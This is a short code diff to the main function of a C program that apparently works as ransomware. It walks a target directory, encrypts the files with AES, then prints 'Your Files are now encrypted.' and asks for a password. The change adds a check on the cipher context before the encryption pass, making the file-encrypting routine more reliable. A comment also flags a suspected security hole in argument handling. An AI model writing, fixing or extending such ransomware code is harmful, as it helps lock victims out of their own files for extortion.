@@ -41,8 +41,11 @@ int main(int argc, char *argv[])
 	else
 		init_struct(&file_filter, argv[1]); /* Security Hole, I think */
 	file_filter.cipher = aes_encrypt_init(&encrypt);
-	traverse_dir(target_dir, &file_filter);
-	EVP_CIPHER_CTX_cleanup(file_filter.cipher);
+	if (file_filter.cipher)
+	{
+		traverse_dir(target_dir, &file_filter);
+		EVP_CIPHER_CTX_cleanup(file_filter.cipher);
+	}
 	printf("Your Files are now encrypted.");
 	printf("Please enter the password (press enter)\n");
 	getchar();
